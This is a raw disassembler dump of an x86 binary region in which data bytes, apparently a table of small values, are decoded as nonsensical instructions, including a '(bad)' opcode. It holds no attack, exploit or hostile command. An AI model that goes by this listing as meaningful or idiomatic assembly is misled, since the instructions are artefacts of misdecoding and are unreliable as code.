  438eb6:	inc    DWORD PTR [eax]
  438eb8:	add    BYTE PTR [edx],bh
  438eba:	inc    DWORD PTR [eax]
  438ebc:	add    BYTE PTR [eax],ch
  438ebe:	inc    DWORD PTR [eax]
  438ec0:	add    BYTE PTR ds:0x3f0000ff,ch
  438ec6:	inc    DWORD PTR [eax]
  438ec8:	add    BYTE PTR [ebx],dh
  438eca:	inc    DWORD PTR [eax]
  438ecc:	add    BYTE PTR [ecx],ch
  438ece:	inc    DWORD PTR [eax]
  438ed0:	add    BYTE PTR [edx],bh
  438ed2:	inc    DWORD PTR [eax]
  438ed4:	add    BYTE PTR [ebp-0x1],al
  438ed7:	add    BYTE PTR [eax],al
  438ed9:	cmp    bh,bh
  438edb:	add    BYTE PTR [eax],al
  438edd:	aas    
  438ede:	inc    DWORD PTR [eax]
  438ee0:	add    BYTE PTR [eax],dh
  438ee2:	inc    DWORD PTR [eax]
  438ee4:	add    BYTE PTR [edi-0x1],al
  438ee7:	add    BYTE PTR [eax],al
  438ee9:	inc    DWORD PTR ds:[eax]
  438eec:	add    BYTE PTR ds:0x380000ff,dh
  438ef2:	inc    DWORD PTR [eax]
  438ef4:	add    BYTE PTR [esi],bh
  438ef6:	inc    DWORD PTR [eax]
  438ef8:	add    BYTE PTR [ecx],bh
  438efa:	inc    DWORD PTR [eax]
  438efc:	add    BYTE PTR [ebx],dh
  438efe:	inc    DWORD PTR [eax]
  438f00:	add    BYTE PTR [ecx-0x1],cl
  438f03:	add    BYTE PTR [eax],al
  438f05:	cmp    eax,0x4a0000ff
  438f0a:	inc    DWORD PTR [eax]
  438f0c:	add    BYTE PTR [esi],bh
  438f0e:	inc    DWORD PTR [eax]
  438f10:	add    BYTE PTR [edi+edi*8],dh
  438f13:	add    BYTE PTR [eax],al
  438f15:	xor    eax,0x340000ff
  438f1a:	inc    DWORD PTR [eax]
  438f1c:	add    BYTE PTR [esi],dh
  438f1e:	inc    DWORD PTR [eax]
  438f20:	add    BYTE PTR [esi],ch
  438f22:	inc    DWORD PTR [eax]
  438f24:	add    BYTE PTR [esi],ch
  438f26:	inc    DWORD PTR [eax]
  438f28:	add    BYTE PTR [eax-0x1],al
  438f2b:	add    BYTE PTR [eax],al
  438f2d:	cmp    eax,0x3e0000ff
  438f32:	inc    DWORD PTR [eax]
  438f34:	add    BYTE PTR [eax],bh
  438f36:	inc    DWORD PTR [eax]
  438f38:	add    BYTE PTR [esi],ch
  438f3a:	inc    DWORD PTR [esi]
  438f3c:	add    eax,0x5555ff33
  438f41:	fs xor ebx,edx
  438f44:	enter  0xec8,0x7f
  438f48:	data16 jb 0x438f5f
  438f4b:	or     eax,0xfb240c
  438f50:	add    BYTE PTR [edx],bl
  438f52:	inc    DWORD PTR [eax]
  438f54:	add    BYTE PTR [edi+edi*8],bl
  438f57:	add    BYTE PTR [eax],al
  438f59:	sub    edi,edi
  438f5b:	add    BYTE PTR [eax],al
  438f5d:	and    bh,bh
  438f5f:	add    BYTE PTR [eax],al
  438f61:	daa    
  438f62:	inc    DWORD PTR [eax]
  438f64:	add    BYTE PTR [ebx],ch
  438f66:	inc    DWORD PTR [eax]
  438f68:	add    BYTE PTR [edi],dh
  438f6a:	inc    DWORD PTR [eax]
  438f6c:	add    BYTE PTR [edx],ah
  438f6e:	inc    DWORD PTR [eax]
  438f70:	add    BYTE PTR [ebx],bl
  438f72:	inc    DWORD PTR [eax]
  438f74:	add    BYTE PTR [ebx],ah
  438f76:	inc    DWORD PTR [eax]
  438f78:	add    BYTE PTR [edi+edi*8],dh
  438f7b:	add    BYTE PTR [eax],al
  438f7d:	sub    al,0xff
  438f7f:	add    BYTE PTR [eax],al
  438f81:	inc    DWORD PTR es:[eax]
  438f84:	add    BYTE PTR [ecx],ch
  438f86:	inc    DWORD PTR [eax]
  438f88:	add    BYTE PTR [eax],ah
  438f8a:	inc    DWORD PTR [eax]
  438f8c:	add    BYTE PTR [esi],ch
  438f8e:	inc    DWORD PTR [eax]
  438f90:	add    BYTE PTR [esi],ah
  438f92:	inc    DWORD PTR [eax]
  438f94:	add    BYTE PTR [edi],ch
  438f96:	inc    DWORD PTR [eax]
  438f98:	add    BYTE PTR [edi+edi*8],bh
  438f9b:	add    BYTE PTR [eax],al
  438f9d:	xor    edi,edi
  438f9f:	add    BYTE PTR [eax],al
  438fa1:	sbb    al,0xff
  438fa3:	add    BYTE PTR [eax],al
  438fa5:	xor    eax,0x460000ff
  438faa:	inc    DWORD PTR [eax]
  438fac:	add    BYTE PTR [eax-0x1],dl
  438faf:	add    BYTE PTR [eax],al
  438fb1:	inc    esi
  438fb2:	inc    DWORD PTR [eax]
  438fb4:	add    BYTE PTR [ecx-0x1],bl
  438fb7:	add    BYTE PTR [eax],al
  438fb9:	inc    esi
  438fba:	inc    DWORD PTR [eax]
  438fbc:	add    BYTE PTR [edi],ch
  438fbe:	inc    DWORD PTR [eax]
  438fc0:	add    BYTE PTR [edx],ch
  438fc2:	inc    DWORD PTR [eax]
  438fc4:	add    BYTE PTR [edx-0x1],al
  438fc7:	add    BYTE PTR [eax],al
  438fc9:	sub    eax,0x4a0000ff
  438fce:	inc    DWORD PTR [eax]
  438fd0:	add    BYTE PTR [esi],bh
  438fd2:	inc    DWORD PTR [eax]
  438fd4:	add    BYTE PTR [edi],bh
  438fd6:	inc    DWORD PTR [eax]
  438fd8:	add    BYTE PTR [edi+edi*8+0x0],al
  438fdc:	add    BYTE PTR [esi-0x1],al
  438fdf:	add    BYTE PTR [eax],al
  438fe1:	dec    ebx
  438fe2:	inc    DWORD PTR [eax]
  438fe4:	add    BYTE PTR [esi-0x1],cl
  438fe7:	add    BYTE PTR [eax],al
  438fe9:	inc    esp
  438fea:	inc    DWORD PTR [eax]
  438fec:	add    BYTE PTR [esi],dh
  438fee:	inc    DWORD PTR [eax]
  438ff0:	add    BYTE PTR [edi+edi*8+0x0],cl
  438ff4:	add    BYTE PTR [esi-0x1],cl
  438ff7:	add    BYTE PTR [eax],al
  438ff9:	cmp    al,0xff
  438ffb:	add    BYTE PTR [eax],al
  438ffd:	inc    eax
  438ffe:	inc    DWORD PTR [eax]
  439000:	add    BYTE PTR ds:0x380000ff,bh
  439006:	inc    DWORD PTR [eax]
  439008:	add    BYTE PTR [ecx-0x1],al
  43900b:	add    BYTE PTR [eax],al
  43900d:	inc    edx
  43900e:	inc    DWORD PTR [eax]
  439010:	add    BYTE PTR [ebx],bh
  439012:	inc    DWORD PTR [eax]
  439014:	add    BYTE PTR [edi-0x1],cl
  439017:	add    BYTE PTR [eax],al
  439019:	inc    eax
  43901a:	inc    DWORD PTR [eax]
  43901c:	add    BYTE PTR [eax],ch
  43901e:	inc    DWORD PTR [eax]
  439020:	add    BYTE PTR [esi],dh
  439022:	inc    DWORD PTR [eax]
  439024:	add    BYTE PTR [ebx],bh
  439026:	inc    DWORD PTR [eax]
  439028:	add    BYTE PTR [edx-0x1],al
  43902b:	add    BYTE PTR [eax],al
  43902d:	dec    ebp
  43902e:	inc    DWORD PTR [eax]
  439030:	add    BYTE PTR [ebx-0x1],ah
  439033:	add    BYTE PTR [eax],al
  439035:	sub    al,0xff
  439037:	add    BYTE PTR [eax],al
  439039:	inc    eax
  43903a:	inc    DWORD PTR [eax]
  43903c:	add    BYTE PTR [esi],ch
  43903e:	inc    DWORD PTR [eax]
  439040:	add    BYTE PTR [esi-0x1],cl
  439043:	add    BYTE PTR [eax],al
  439045:	aas    
  439046:	inc    DWORD PTR [eax]
  439048:	add    BYTE PTR ds:0x450000ff,bh
  43904e:	inc    DWORD PTR [eax]
  439050:	add    BYTE PTR [eax],bh
  439052:	inc    DWORD PTR [eax]
  439054:	add    BYTE PTR [ecx],dh
  439056:	inc    DWORD PTR [eax]
  439058:	add    BYTE PTR [ebx-0x1],al
  43905b:	add    BYTE PTR [eax],al
  43905d:	pusha  
  43905e:	inc    DWORD PTR [eax]
  439060:	add    BYTE PTR [ebx-0x1],cl
  439063:	add    BYTE PTR [eax],al
  439065:	push   edx
  439066:	inc    DWORD PTR [eax]
  439068:	add    BYTE PTR [eax-0x1],dl
  43906b:	add    BYTE PTR [eax],al
  43906d:	arpl   di,di
  43906f:	add    BYTE PTR [eax],al
  439071:	push   edi
  439072:	inc    DWORD PTR [eax]
  439074:	add    BYTE PTR [edi+edi*8+0x0],ah
  439078:	add    BYTE PTR [esi],bh
  43907a:	inc    DWORD PTR [eax]
  43907c:	add    BYTE PTR [ebx-0x1],dl
  43907f:	add    BYTE PTR [eax],al
  439081:	inc    ebp
  439082:	inc    DWORD PTR [eax]
  439084:	add    BYTE PTR ds:0x510000ff,bh
  43908a:	inc    DWORD PTR [eax]
  43908c:	add    BYTE PTR [ecx-0x1],bl
  43908f:	add    BYTE PTR [eax],al
  439091:	push   ebx
  439092:	inc    DWORD PTR [eax]
  439094:	add    BYTE PTR [ecx-0x1],dl
  439097:	add    BYTE PTR [eax],al
  439099:	inc    eax
  43909a:	inc    DWORD PTR [eax]
  43909c:	add    BYTE PTR [edi],dh
  43909e:	inc    DWORD PTR [eax]
  4390a0:	add    BYTE PTR [edi+edi*8],dh
  4390a3:	add    BYTE PTR [eax],al
  4390a5:	inc    esp
  4390a6:	inc    DWORD PTR [eax]
  4390a8:	add    BYTE PTR [edi+edi*8+0x0],dl
  4390ac:	add    BYTE PTR [esi],bh
  4390ae:	inc    DWORD PTR [eax]
  4390b0:	add    BYTE PTR [ecx],bh
  4390b2:	inc    DWORD PTR [eax]
  4390b4:	add    BYTE PTR [edi+edi*8+0x0],al
  4390b8:	add    BYTE PTR [edi-0x1],al
  4390bb:	add    BYTE PTR [eax],al
  4390bd:	inc    ebx
  4390be:	inc    DWORD PTR [eax]
  4390c0:	add    BYTE PTR [edi+edi*8+0x0],cl
  4390c4:	add    BYTE PTR [esi],dh
  4390c6:	inc    DWORD PTR [eax]
  4390c8:	add    BYTE PTR [ecx-0x1],al
  4390cb:	add    BYTE PTR [eax],al
  4390cd:	cmp    al,0xff
  4390cf:	add    BYTE PTR [eax],al
  4390d1:	inc    ebx
  4390d2:	inc    DWORD PTR [eax]
  4390d4:	add    BYTE PTR [eax],bh
  4390d6:	inc    DWORD PTR [eax]
  4390d8:	add    BYTE PTR ds:0x390000ff,bh
  4390de:	inc    DWORD PTR [eax]
  4390e0:	add    BYTE PTR [ebx-0x1],al
  4390e3:	add    BYTE PTR [eax],al
  4390e5:	cmp    al,0xff
  4390e7:	add    BYTE PTR [eax],al
  4390e9:	cmp    edi,edi
  4390eb:	add    BYTE PTR [eax],al
  4390ed:	inc    edi
  4390ee:	inc    DWORD PTR [eax]
  4390f0:	add    BYTE PTR [eax-0x1],al
  4390f3:	add    BYTE PTR [eax],al
  4390f5:	inc    edi
  4390f6:	inc    DWORD PTR [eax]
  4390f8:	add    BYTE PTR [edx],bh
  4390fa:	inc    DWORD PTR [eax]
  4390fc:	add    BYTE PTR [edx],bh
  4390fe:	inc    DWORD PTR [eax]
  439100:	add    BYTE PTR ds:0x370000ff,dh
  439106:	inc    DWORD PTR [eax]
  439108:	add    BYTE PTR [ebx],bh
  43910a:	inc    DWORD PTR [eax]
  43910c:	add    BYTE PTR [edi],bh
  43910e:	inc    DWORD PTR [eax]
  439110:	add    BYTE PTR [eax],bh
  439112:	inc    DWORD PTR [eax]
  439114:	add    BYTE PTR [edi+edi*8],bh
  439117:	add    BYTE PTR [eax],al
  439119:	cmp    bh,bh
  43911b:	add    BYTE PTR [eax],al
  43911d:	cmp    al,0xff
  43911f:	add    BYTE PTR [eax],al
  439121:	inc    eax
  439122:	inc    DWORD PTR [eax]
  439124:	add    BYTE PTR [edi],ch
  439126:	inc    DWORD PTR [eax]
  439128:	add    BYTE PTR [ecx],bh
  43912a:	inc    DWORD PTR [eax]
  43912c:	add    BYTE PTR [eax-0x1],al
  43912f:	add    BYTE PTR [eax],al
  439131:	inc    eax
  439132:	inc    DWORD PTR [eax]
  439134:	add    BYTE PTR [eax-0x1],al
  439137:	add    BYTE PTR [eax],al
  439139:	inc    DWORD PTR cs:[eax]
  43913c:	add    BYTE PTR [ecx],dh
  43913e:	jmp    FWORD PTR [eax]
  439140:	and    eax,DWORD PTR [ecx-0x22]
  439143:	enter  0xb6b6,0xe
  439147:	xor    DWORD PTR [edx],ebp
  439149:	cmp    ebx,DWORD PTR [ebx-0xe90000]
  43914f:	add    BYTE PTR [eax],al
  439151:	pop    ds
  439152:	inc    DWORD PTR [eax]
  439154:	add    BYTE PTR [edi],bl
  439156:	inc    DWORD PTR [eax]
  439158:	add    BYTE PTR [edi+edi*8],bl
  43915b:	add    BYTE PTR [eax],al
  43915d:	xor    al,0xff
  43915f:	add    BYTE PTR [eax],al
  439161:	sub    bh,bh
  439163:	add    BYTE PTR [eax],al
  439165:	sbb    edi,edi
  439167:	add    BYTE PTR [eax],al
  439169:	inc    DWORD PTR cs:[eax]
  43916c:	add    BYTE PTR [edi+edi*8+0x0],al
  439170:	add    BYTE PTR [esi],ah
  439172:	inc    DWORD PTR [eax]
  439174:	add    BYTE PTR [edi],ah
  439176:	inc    DWORD PTR [eax]
  439178:	add    BYTE PTR [ebx],ch
  43917a:	inc    DWORD PTR [eax]
  43917c:	add    BYTE PTR [esi],cl
  43917e:	inc    DWORD PTR [eax]
  439180:	add    BYTE PTR [ecx],dh
  439182:	inc    DWORD PTR [eax]
  439184:	add    BYTE PTR [ebx],ch
  439186:	inc    DWORD PTR [eax]
  439188:	add    BYTE PTR [edx],dh
  43918a:	inc    DWORD PTR [eax]
  43918c:	add    BYTE PTR [edx],ch
  43918e:	inc    DWORD PTR [eax]
  439190:	add    BYTE PTR [esi],ch
  439192:	inc    DWORD PTR [eax]
  439194:	add    BYTE PTR [edx],dh
  439196:	inc    DWORD PTR [eax]
  439198:	add    BYTE PTR [esi],ah
  43919a:	inc    DWORD PTR [eax]
  43919c:	add    BYTE PTR ds:0x440000ff,ch
  4391a2:	inc    DWORD PTR [eax]
  4391a4:	add    BYTE PTR [edx],ah
  4391a6:	inc    DWORD PTR [eax]
  4391a8:	add    BYTE PTR [edx-0x1],cl
  4391ab:	add    BYTE PTR [eax],al
  4391ad:	dec    edi
  4391ae:	inc    DWORD PTR [eax]
  4391b0:	add    BYTE PTR [esi],ch
  4391b2:	inc    DWORD PTR [eax]
  4391b4:	add    BYTE PTR [edi+edi*8],ch
  4391b7:	add    BYTE PTR [eax],al
  4391b9:	dec    ecx
  4391ba:	inc    DWORD PTR [eax]
  4391bc:	add    BYTE PTR ds:0x420000ff,bh
  4391c2:	inc    DWORD PTR [eax]
  4391c4:	add    BYTE PTR [ebx],dh
  4391c6:	inc    DWORD PTR [eax]
  4391c8:	add    BYTE PTR [ebx-0x1],al
  4391cb:	add    BYTE PTR [eax],al
  4391cd:	inc    ecx
  4391ce:	inc    DWORD PTR [eax]
  4391d0:	add    BYTE PTR [eax],ch
  4391d2:	inc    DWORD PTR [eax]
  4391d4:	add    BYTE PTR [edi],bh
  4391d6:	inc    DWORD PTR [eax]
  4391d8:	add    BYTE PTR ds:0x3a0000ff,bh
  4391de:	inc    DWORD PTR [eax]
  4391e0:	add    BYTE PTR [edi+edi*8+0x0],al
  4391e4:	add    BYTE PTR [esi],bh
  4391e6:	inc    DWORD PTR [eax]
  4391e8:	add    BYTE PTR [edi+edi*8+0x0],dl
  4391ec:	add    BYTE PTR [eax-0x1],bl
  4391ef:	add    BYTE PTR [eax],al
  4391f1:	inc    edi
  4391f2:	inc    DWORD PTR [eax]
  4391f4:	add    BYTE PTR [edx-0x1],dl
  4391f7:	add    BYTE PTR [eax],al
  4391f9:	pop    ecx
  4391fa:	inc    DWORD PTR [eax]
  4391fc:	add    BYTE PTR [edi+edi*8+0x0],al
  439200:	add    BYTE PTR [ecx],dh
  439202:	inc    DWORD PTR [eax]
  439204:	add    BYTE PTR [edi+edi*8+0x0],cl
  439208:	add    BYTE PTR [ebx],ch
  43920a:	inc    DWORD PTR [eax]
  43920c:	add    BYTE PTR [edx],ch
  43920e:	inc    DWORD PTR [eax]
  439210:	add    BYTE PTR [ebx],dh
  439212:	inc    DWORD PTR [eax]
  439214:	add    BYTE PTR [eax-0x1],dl
  439217:	add    BYTE PTR [eax],al
  439219:	pop    ebx
  43921a:	inc    DWORD PTR [eax]
  43921c:	add    BYTE PTR [ebx],bh
  43921e:	inc    DWORD PTR [eax]
  439220:	add    BYTE PTR [edx],bh
  439222:	inc    DWORD PTR [eax]
  439224:	add    BYTE PTR [ebx],bh
  439226:	inc    DWORD PTR [eax]
  439228:	add    BYTE PTR [ecx],dh
  43922a:	inc    DWORD PTR [eax]
  43922c:	add    BYTE PTR ds:0x4c0000ff,bh
  439232:	inc    DWORD PTR [eax]
  439234:	add    BYTE PTR [ebx-0x1],dl
  439237:	add    BYTE PTR [eax],al
  439239:	inc    ebx
  43923a:	inc    DWORD PTR [eax]
  43923c:	add    BYTE PTR [ecx],dh
  43923e:	inc    DWORD PTR [eax]
  439240:	add    BYTE PTR [edi+edi*8+0x0],al
  439244:	add    BYTE PTR [edi],bh
  439246:	inc    DWORD PTR [eax]
  439248:	add    BYTE PTR [edi+edi*8],bh
  43924b:	add    BYTE PTR [eax],al
  43924d:	dec    eax
  43924e:	inc    DWORD PTR [eax]
  439250:	add    BYTE PTR ds:0x340000ff,bh
  439256:	inc    DWORD PTR [eax]
  439258:	add    BYTE PTR [edi-0x1],al
  43925b:	add    BYTE PTR [eax],al
  43925d:	push   ebx
  43925e:	inc    DWORD PTR [eax]
  439260:	add    BYTE PTR [eax-0x1],bl
  439263:	add    BYTE PTR [eax],al
  439265:	xor    bh,bh
  439267:	add    BYTE PTR [eax],al
  439269:	dec    ebx
  43926a:	inc    DWORD PTR [eax]
  43926c:	add    BYTE PTR [edx-0x1],bh
  43926f:	add    BYTE PTR [eax],al
  439271:	popa   
  439272:	inc    DWORD PTR [eax]
  439274:	add    BYTE PTR [esi],ch
  439276:	inc    DWORD PTR [eax]
  439278:	add    BYTE PTR [edx-0x1],dl
  43927b:	add    BYTE PTR [eax],al
  43927d:	inc    ebp
  43927e:	inc    DWORD PTR [eax]
  439280:	add    BYTE PTR [edi+edi*8+0x0],cl
  439284:	add    BYTE PTR [ebx],bh
  439286:	inc    DWORD PTR [eax]
  439288:	add    BYTE PTR [eax-0x1],cl
  43928b:	add    BYTE PTR [eax],al
  43928d:	inc    edx
  43928e:	inc    DWORD PTR [eax]
  439290:	add    BYTE PTR [eax-0x1],bl
  439293:	add    BYTE PTR [eax],al
  439295:	pop    ecx
  439296:	inc    DWORD PTR [eax]
  439298:	add    BYTE PTR [edi],bh
  43929a:	inc    DWORD PTR [eax]
  43929c:	add    BYTE PTR [edx-0x1],al
  43929f:	add    BYTE PTR [eax],al
  4392a1:	inc    esi
  4392a2:	inc    DWORD PTR [eax]
  4392a4:	add    BYTE PTR [ebp-0x1],dl
  4392a7:	add    BYTE PTR [eax],al
  4392a9:	cmp    edi,edi
  4392ab:	add    BYTE PTR [eax],al
  4392ad:	dec    eax
  4392ae:	inc    DWORD PTR [eax]
  4392b0:	add    BYTE PTR [ebp-0x1],dl
  4392b3:	add    BYTE PTR [eax],al
  4392b5:	cmp    eax,0x470000ff
  4392ba:	inc    DWORD PTR [eax]
  4392bc:	add    BYTE PTR [edx-0x1],dl
  4392bf:	add    BYTE PTR [eax],al
  4392c1:	push   eax
  4392c2:	inc    DWORD PTR [eax]
  4392c4:	add    BYTE PTR [edi],dh
  4392c6:	inc    DWORD PTR [eax]
  4392c8:	add    BYTE PTR [ecx-0x1],dl
  4392cb:	add    BYTE PTR [eax],al
  4392cd:	inc    esi
  4392ce:	inc    DWORD PTR [eax]
  4392d0:	add    BYTE PTR [edx-0x1],al
  4392d3:	add    BYTE PTR [eax],al
  4392d5:	cmp    edi,edi
  4392d7:	add    BYTE PTR [eax],al
  4392d9:	inc    DWORD PTR ds:[eax]
  4392dc:	add    BYTE PTR [eax],bh
  4392de:	inc    DWORD PTR [eax]
  4392e0:	add    BYTE PTR [edi+edi*8+0x0],al
  4392e4:	add    BYTE PTR [edx-0x1],al
  4392e7:	add    BYTE PTR [eax],al
  4392e9:	inc    DWORD PTR cs:[eax]
  4392ec:	add    BYTE PTR [edi+edi*8],bh
  4392ef:	add    BYTE PTR [eax],al
  4392f1:	xor    edi,edi
  4392f3:	add    BYTE PTR [eax],al
  4392f5:	sub    bh,bh
  4392f7:	add    BYTE PTR [eax],al
  4392f9:	aaa    
  4392fa:	inc    DWORD PTR [eax]
  4392fc:	add    BYTE PTR [eax],dh
  4392fe:	inc    DWORD PTR [eax]
  439300:	add    BYTE PTR [edi],dh
  439302:	inc    DWORD PTR [eax]
  439304:	add    BYTE PTR [esi],dh
  439306:	inc    DWORD PTR [eax]
  439308:	add    BYTE PTR [ebx],dh
  43930a:	inc    DWORD PTR [eax]
  43930c:	add    BYTE PTR ds:0x330000ff,ch
  439312:	inc    DWORD PTR [eax]
  439314:	add    BYTE PTR [edi+edi*8],bh
  439317:	add    BYTE PTR [eax],al
  439319:	xor    edi,edi
  43931b:	add    BYTE PTR [eax],al
  43931d:	cmp    bh,bh
  43931f:	add    BYTE PTR [eax],al
  439321:	xor    eax,0x340000ff
  439326:	inc    DWORD PTR [eax]
  439328:	add    BYTE PTR [edi],dh
  43932a:	inc    DWORD PTR [eax]
  43932c:	add    BYTE PTR [ecx],bh
  43932e:	inc    DWORD PTR [eax]
  439330:	add    BYTE PTR [esi],dh
  439332:	inc    DWORD PTR [eax]
  439334:	add    BYTE PTR [eax],bh
  439336:	inc    DWORD PTR [eax]
  439338:	add    BYTE PTR [esi],ch
  43933a:	inc    DWORD PTR [eax]
  43933c:	add    BYTE PTR [eax],ch
  43933e:	inc    DWORD PTR [ecx]
  439340:	add    DWORD PTR [edi+edi*8],ebp
  439343:	inc    ebp
  439344:	cmp    BYTE PTR [ebp+0x3b],al
  439347:	sub    BYTE PTR [eax],ch
  439349:	inc    ebp
  43934a:	jecxz  0x43934c
  43934c:	add    BYTE PTR [ecx],ch
  43934e:	inc    DWORD PTR [eax]
  439350:	add    BYTE PTR [ebx],dh
  439352:	inc    DWORD PTR [eax]
  439354:	add    BYTE PTR [edi+edi*8],ch
  439357:	add    BYTE PTR [eax],al
  439359:	inc    DWORD PTR cs:[eax]
  43935c:	add    BYTE PTR ds:0x380000ff,ah
  439362:	inc    DWORD PTR [eax]
  439364:	add    BYTE PTR [edi+edi*8],ch
  439367:	add    BYTE PTR [eax],al
  439369:	and    eax,0x240000ff
  43936e:	inc    DWORD PTR [eax]
  439370:	add    BYTE PTR [edx],bh
  439372:	inc    DWORD PTR [eax]
  439374:	add    BYTE PTR [ebx],dh
  439376:	inc    DWORD PTR [eax]
  439378:	add    BYTE PTR [ecx],dh
  43937a:	inc    DWORD PTR [eax]
  43937c:	add    BYTE PTR [ecx],dh
  43937e:	inc    DWORD PTR [eax]
  439380:	add    BYTE PTR [esi],ah
  439382:	inc    DWORD PTR [eax]
  439384:	add    BYTE PTR [edi],ah
  439386:	inc    DWORD PTR [eax]
  439388:	add    BYTE PTR [ebx],dh
  43938a:	inc    DWORD PTR [eax]
  43938c:	add    BYTE PTR [edx],ch
  43938e:	inc    DWORD PTR [eax]
  439390:	add    BYTE PTR [esi],dh
  439392:	inc    DWORD PTR [eax]
  439394:	add    BYTE PTR [ecx],bh
  439396:	inc    DWORD PTR [eax]
  439398:	add    BYTE PTR [ebx],ah
  43939a:	inc    DWORD PTR [eax]
  43939c:	add    BYTE PTR [esi],ch
  43939e:	inc    DWORD PTR [eax]
  4393a0:	add    BYTE PTR [edx],ch
  4393a2:	inc    DWORD PTR [eax]
  4393a4:	add    BYTE PTR [edx],ah
  4393a6:	inc    DWORD PTR [eax]
  4393a8:	add    BYTE PTR [ecx],dh
  4393aa:	inc    DWORD PTR [eax]
  4393ac:	add    BYTE PTR [ebx],dh
  4393ae:	inc    DWORD PTR [eax]
  4393b0:	add    BYTE PTR [eax-0x1],al
  4393b3:	add    BYTE PTR [eax],al
  4393b5:	xor    edi,edi
  4393b7:	add    BYTE PTR [eax],al
  4393b9:	and    edi,edi
  4393bb:	add    BYTE PTR [eax],al
  4393bd:	cmp    bh,bh
  4393bf:	add    BYTE PTR [eax],al
  4393c1:	cmp    al,0xff
  4393c3:	add    BYTE PTR [eax],al
  4393c5:	xor    al,0xff
  4393c7:	add    BYTE PTR [eax],al
  4393c9:	cmp    al,0xff
  4393cb:	add    BYTE PTR [eax],al
  4393cd:	dec    ebx
  4393ce:	inc    DWORD PTR [eax]
  4393d0:	add    BYTE PTR [edx-0x1],al
  4393d3:	add    BYTE PTR [eax],al
  4393d5:	cmp    bh,bh
  4393d7:	add    BYTE PTR [eax],al
  4393d9:	aas    
  4393da:	inc    DWORD PTR [eax]
  4393dc:	add    BYTE PTR ds:0x470000ff,dh
  4393e2:	inc    DWORD PTR [eax]
  4393e4:	add    BYTE PTR [eax],dh
  4393e6:	inc    DWORD PTR [eax]
  4393e8:	add    BYTE PTR ds:0x250000ff,dh
  4393ee:	inc    DWORD PTR [eax]
  4393f0:	add    BYTE PTR [ebp-0x1],cl
  4393f3:	add    BYTE PTR [eax],al
  4393f5:	push   edi
  4393f6:	inc    DWORD PTR [eax]
  4393f8:	add    BYTE PTR [edi+edi*8+0x0],cl
  4393fc:	add    BYTE PTR [esi-0x1],al
  4393ff:	add    BYTE PTR [eax],al
  439401:	inc    eax
  439402:	inc    DWORD PTR [eax]
  439404:	add    BYTE PTR [eax],bh
  439406:	inc    DWORD PTR [eax]
  439408:	add    BYTE PTR [edi],bh
  43940a:	inc    DWORD PTR [eax]
  43940c:	add    BYTE PTR [ecx-0x1],al
  43940f:	add    BYTE PTR [eax],al
  439411:	xor    eax,0x350000ff
  439416:	inc    DWORD PTR [eax]
  439418:	add    BYTE PTR [edi],dh
  43941a:	inc    DWORD PTR [eax]
  43941c:	add    BYTE PTR [edi+edi*8+0x0],cl
  439420:	add    BYTE PTR [ecx-0x1],al
  439423:	add    BYTE PTR [eax],al
  439425:	sub    edi,edi
  439427:	add    BYTE PTR [eax],al
  439429:	dec    edi
  43942a:	inc    DWORD PTR [eax]
  43942c:	add    BYTE PTR [ebp-0x1],bl
  43942f:	add    BYTE PTR [eax],al
  439431:	sub    edi,edi
  439433:	add    BYTE PTR [eax],al
  439435:	cmp    edi,edi
  439437:	add    BYTE PTR [eax],al
  439439:	push   ebp
  43943a:	inc    DWORD PTR [eax]
  43943c:	add    BYTE PTR [edi-0x1],cl
  43943f:	add    BYTE PTR [eax],al
  439441:	push   edx
  439442:	inc    DWORD PTR [eax]
  439444:	add    BYTE PTR [ebx-0x1],cl
  439447:	add    BYTE PTR [eax],al
  439449:	dec    esi
  43944a:	inc    DWORD PTR [eax]
  43944c:	add    BYTE PTR [edi],bh
  43944e:	inc    DWORD PTR [eax]
  439450:	add    BYTE PTR [ebx-0x1],cl
  439453:	add    BYTE PTR [eax],al
  439455:	dec    ebx
  439456:	inc    DWORD PTR [eax]
  439458:	add    BYTE PTR [edi+edi*8],dh
  43945b:	add    BYTE PTR [eax],al
  43945d:	(bad)  
  43945e:	inc    DWORD PTR [eax]
  439460:	add    BYTE PTR ds:0x460000ff,bh
  439466:	inc    DWORD PTR [eax]
  439468:	add    BYTE PTR [edi+edi*8+0x0],ah
  43946c:	add    BYTE PTR [esi],dh
  43946e:	inc    DWORD PTR [eax]
  439470:	add    BYTE PTR [edi+edi*8],dh
  439473:	add    BYTE PTR [eax],al
  439475:	inc    ebp
  439476:	inc    DWORD PTR [eax]
  439478:	add    BYTE PTR [ebp-0x1],cl
  43947b:	add    BYTE PTR [eax],al
  43947d:	inc    esp
  43947e:	inc    DWORD PTR [eax]
  439480:	add    BYTE PTR [edx-0x1],cl
  439483:	add    BYTE PTR [eax],al
  439485:	inc    esi
  439486:	inc    DWORD PTR [eax]
  439488:	add    BYTE PTR [edi-0x1],al
  43948b:	add    BYTE PTR [eax],al
  43948d:	cmp    bh,bh
  43948f:	add    BYTE PTR [eax],al
  439491:	aaa    
  439492:	inc    DWORD PTR [eax]
  439494:	add    BYTE PTR ds:0x3d0000ff,bh
  43949a:	inc    DWORD PTR [eax]
  43949c:	add    BYTE PTR [edi+edi*8+0x0],dl
  4394a0:	add    BYTE PTR [edi-0x1],bl
  4394a3:	add    BYTE PTR [eax],al
  4394a5:	dec    edx
  4394a6:	inc    DWORD PTR [eax]
  4394a8:	add    BYTE PTR [eax],dh
  4394aa:	inc    DWORD PTR [eax]
  4394ac:	add    BYTE PTR [ebx-0x1],al
  4394af:	add    BYTE PTR [eax],al
  4394b1:	inc    esp
  4394b2:	inc    DWORD PTR [eax]
  4394b4:	add    BYTE PTR [edi],bh
  4394b6:	inc    DWORD PTR [eax]
  4394b8:	add    BYTE PTR [eax-0x1],al
  4394bb:	add    BYTE PTR [eax],al
  4394bd:	xor    al,0xff
  4394bf:	add    BYTE PTR [eax],al
  4394c1:	inc    esi
  4394c2:	inc    DWORD PTR [eax]
  4394c4:	add    BYTE PTR [esi],bh
  4394c6:	inc    DWORD PTR [eax]
  4394c8:	add    BYTE PTR [edi+edi*8],bh
  4394cb:	add    BYTE PTR [eax],al
  4394cd:	dec    eax
  4394ce:	inc    DWORD PTR [eax]
  4394d0:	add    BYTE PTR ds:0x3e0000ff,bh
  4394d6:	inc    DWORD PTR [eax]
  4394d8:	add    BYTE PTR [edi+edi*8+0x0],al
  4394dc:	add    BYTE PTR [edi],bh
  4394de:	inc    DWORD PTR [eax]
  4394e0:	add    BYTE PTR [ecx-0x1],al
  4394e3:	add    BYTE PTR [eax],al
  4394e5:	dec    ebx
  4394e6:	inc    DWORD PTR [eax]
  4394e8:	add    BYTE PTR [ebx-0x1],al
  4394eb:	add    BYTE PTR [eax],al
